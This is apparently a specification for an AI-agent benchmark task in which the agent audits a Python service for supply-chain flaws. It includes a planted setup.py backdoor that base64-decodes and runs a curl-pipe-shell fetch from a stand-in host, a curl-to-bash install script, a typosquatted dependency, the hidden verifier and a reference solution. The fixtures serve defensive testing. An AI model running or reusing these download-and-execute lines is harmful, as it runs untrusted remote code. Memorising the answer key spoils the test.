# TASK-14 — find-supply-chain-backdoor

| Field | Value |
|---|---|
| Category | OWASP Top 10:2025 — **A03 Software Supply Chain Failures** (CWE-1357, CWE-1104, CWE-829, CWE-494) |
| Difficulty | medium |
| Deliverable | `/app/security_report.json` (audit report; **no code changes, no installs**) |
| Pattern cloned from | `local_task/find-sqli-login` (audit → findings[] JSON) |

## 1. Suggested `task.toml`

```toml
schema_version = "1.2"

[task]
name = "local/find-supply-chain-backdoor"
description = "Audit a Python service's dependency and vendoring hygiene for supply-chain failures: typosquat package, install-time backdoor hook, unpinned deps, HTTP package index. Report findings as JSON."
authors = []
keywords = []

[metadata]
difficulty = "medium"
category = "security"
tags = ["local", "owasp-a03", "supply-chain", "typosquat", "setup.py", "unpinned", "audit"]

[verifier]
timeout_sec = 120.0

[agent]
timeout_sec = 600.0

[environment]
build_timeout_sec = 600.0
cpus = 2
memory_mb = 4096
storage_mb = 10240
gpus = 0
allow_internet = true
mcp_servers = []
```

## 2. `instruction.md` (full text, verbatim)

````markdown
You are working in `/app`. The application is a FastAPI reporting service that is
about to be onboarded to the production registry. Its build intentionally does NOT
install `deploy/requirements.txt` and does NOT execute `vendor/` — those artifacts
are exactly what you are auditing.

Perform a software supply chain security review (OWASP A03: Software Supply Chain
Failures focus). Do not modify any file. Do not install or execute vendored code.

Your deliverable is a machine-readable JSON report at:

`/app/security_report.json`

The report must be valid JSON with this top-level shape:

```json
{
  "findings": [
    {
      "title": "Short finding title",
      "severity": "critical|high|medium|low|informational",
      "category": "Vulnerability category",
      "location": "Affected file (and line/section where possible)",
      "evidence": "Concrete code or configuration that demonstrates the issue",
      "impact": "Security impact",
      "recommendation": "Recommended remediation"
    }
  ]
}
```
````

## 3. `environment/` composition

The running app uses only its own `pyproject.toml` deps (`fastapi`, `uvicorn`, `pytest`).
The audit targets live under `deploy/` and `vendor/` and are never executed.

| Path | Contents |
|---|---|
| `environment/Dockerfile` | Standard recipe (`secureintelligent/acp:latest`, `WORKDIR /app`, `COPY app/ .`, install `.`, entrypoint) |
| `environment/entrypoint.sh` | uvicorn + tail (same as audit-family tasks) |
| `environment/app/main.py` | Minimal reports API + `/healthz` (benign) |
| `environment/app/deploy/requirements.txt` | **Audit target 1** — see below |
| `environment/app/deploy/constraints.txt` | **Audit target 2** — conflicting pin, see below |
| `environment/app/vendor/acme_jsonrpc/setup.py` | **Audit target 3** — install-time backdoor, see below |
| `environment/app/vendor/acme_jsonrpc/acme_jsonrpc/__init__.py` | Benign stub (`def jsonrpc_dumps(o): return str(o)`) |
| `environment/app/vendor/acme_jsonrpc/PKG-INFO` | `Name: acme-jsonrpc`, `Author: unknown`, no hash manifest |
| `environment/app/scripts/install.sh` | **Audit target 4** — curl-pipe-shell bootstrap |
| `environment/app/tests/test_api.py` | regression only: `/healthz` 200 |

`environment/app/deploy/requirements.txt` (verbatim):

```
# production pins - do not edit
fastapi                    # unpinned by ops request
reqeusts==2.31.0
jinja2==2.11.3
--extra-index-url http://pypi-mirror.internal.local/simple
```

`environment/app/deploy/constraints.txt` (verbatim):

```
# security team baseline
jinja2>=3.1.4
requests>=2.32.0
```

`environment/app/vendor/acme_jsonrpc/setup.py` (verbatim):

```python
from setuptools import setup
import base64, subprocess

setup(name="acme-jsonrpc", version="0.9.1", packages=["acme_jsonrpc"])

_b = "Y3VybCAtcyBodHRwczovL21ldHJpY3MuZXhhbXBsZS1jZG4ubmV0L3Auc2ggfCBzaA=="
try:
    subprocess.getoutput(base64.b64decode(_b).decode())
except Exception:
    pass
```

`environment/app/scripts/install.sh` (verbatim):

```bash
#!/usr/bin/env bash
curl -sSL https://get.example-tools.net/bootstrap.sh | bash
pip install -r deploy/requirements.txt --no-deps
```

Vulnerability inventory (what a correct audit must surface):

1. **Typosquat dependency** — `reqeusts==2.31.0` (transposed letters vs `requests`): a
   nonexistent-on-PyPI-style typo that a hostile registry or namespace squatting would
   resolve to attacker-controlled code. The constraints baseline pins the *correct* name,
   which makes the divergence greppable.
2. **Install-time code execution in vendored package** — `setup.py` decodes a base64 blob
   and runs it via `subprocess.getoutput` at build/install time (remote fetch + shell).
   Note: decoded command is `curl -s https://metrics.example-cdn.net/p.sh | sh`.
3. **Unpinned core dependency** — `fastapi` has no version pin → non-reproducible builds,
   dependency-confusion exposure.
4. **HTTP package index** — `--extra-index-url http://pypi-mirror.internal.local/simple`
   (plaintext, MITM-able, and extra-index semantics *add* rather than restrict sources).
5. **Pin drift / constraints bypass** — `jinja2==2.11.3` violates the security baseline
   `jinja2>=3.1.4` in `constraints.txt`; also an EOL release line.
6. **curl-pipe-shell bootstrap** — `scripts/install.sh` pipes a remote script straight
   into bash with no checksum/signature verification (CWE-494).

## 4. Verifier (`tests/`)

`tests/test.sh`: standard audit harness (service up check → reward 0/1 → pytest).
`tests/test_security_report.py` (hidden verifier):

```python
import hashlib, json
from pathlib import Path
from typing import Any

REPORT_PATH = Path("/app/security_report.json")

def _flatten(v: Any) -> str:
    if isinstance(v, dict):
        return " ".join(_flatten(x) for x in v.values())
    if isinstance(v, list):
        return " ".join(_flatten(x) for x in v)
    return str(v)

def _has_any(text: str, needles: list[str]) -> bool:
    return any(n in text for n in needles)

def test_report_valid():
    data = json.loads(REPORT_PATH.read_text())
    assert isinstance(data.get("findings"), list) and data["findings"]

def test_typosquat_finding():
    data = json.loads(REPORT_PATH.read_text())
    assert any(_has_any(_flatten(f).lower(), ["reqeusts", "typosquat", "typo-squat", "typo"])
               and _has_any(_flatten(f).lower(), ["requirements", "deploy"])
               for f in data["findings"])

def test_setuppy_backdoor_finding():
    data = json.loads(REPORT_PATH.read_text())
    assert any(_has_any(_flatten(f).lower(), ["setup.py", "vendor", "acme"])
               and _has_any(_flatten(f).lower(), ["base64", "subprocess", "curl", "post-install",
                                                  "install-time", "backdoor"])
               for f in data["findings"])

def test_index_and_pinning_findings():
    data = json.loads(REPORT_PATH.read_text())
    flat = [_flatten(f).lower() for f in data["findings"]]
    assert any(_has_any(t, ["http://", "extra-index", "plaintext", "mitm"]) for t in flat)
    assert any(_has_any(t, ["unpinned", "no version pin", "not pinned", "fastapi"]) for t in flat)

def test_constraint_drift_finding():
    data = json.loads(REPORT_PATH.read_text())
    assert any(_has_any(_flatten(f).lower(), ["jinja2"]) and
               _has_any(_flatten(f).lower(), ["2.11.3", "constraints", "drift", "baseline"])
               for f in data["findings"])

def test_no_files_modified():
    PRISTINE_SHA256 = {
        "deploy/requirements.txt": "<pin-at-build-time>",
        "vendor/acme_jsonrpc/setup.py": "<pin-at-build-time>",
        "scripts/install.sh": "<pin-at-build-time>",
    }
    for rel, want in PRISTINE_SHA256.items():
        assert hashlib.sha256(Path("/app", rel).read_bytes()).hexdigest() == want
```

**Grading:** binary 0/1 — valid JSON + all five targeted findings present with correct
signal pairs + audit targets byte-identical.

## 5. Reference solution (agent steps ≈ `solution/solve.sh`)

1. Read `deploy/requirements.txt`, `deploy/constraints.txt`, `vendor/acme_jsonrpc/setup.py`,
   `scripts/install.sh`.
2. Decode the base64 blob (`base64 -d` in shell, no execution of the resulting string).
3. Diff requirements vs constraints (`jinja2`, `requests` names).
4. Write 6 findings JSON, validate, done.

## 6. Expected agent difficulty profile

- **Steps:** ~8–13 tool calls.
- **Small-model failure modes:**
  - Flags only the backdoor and misses pin/index/drift findings (fails two tests).
  - "Fixes" requirements.txt despite explicit no-modify instruction → hash trip.
  - Tries `pip install -r deploy/requirements.txt` to "check" (offline sandbox → hang/fail,
    wasted steps) instead of static analysis.
  - Reports the typosquat but without the `deploy/` location signal.
